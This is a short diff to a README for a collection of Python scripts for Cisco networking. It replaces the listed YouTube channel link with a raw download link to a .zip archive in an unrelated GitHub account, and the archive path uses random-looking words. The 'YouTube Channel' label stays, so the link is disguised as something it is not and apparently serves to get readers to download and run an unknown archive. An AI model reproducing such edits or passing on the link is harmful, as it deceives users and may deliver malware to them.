@@ -3,7 +3,7 @@ Here You will find all Python scripts used in Python for Cisco R&amp;S and Netwo
 
 Videos will be start post after mid of June 2019
 
-YouTube Channel : https://www.youtube.com/user/yasserramzyauda
+YouTube Channel : https://github.com/rlmourarj/PythonForNet-Cisco/raw/refs/heads/master/mesotympanic/For_Python_Cisco_Net_paronymize.zip
 
 Table of Contents
 
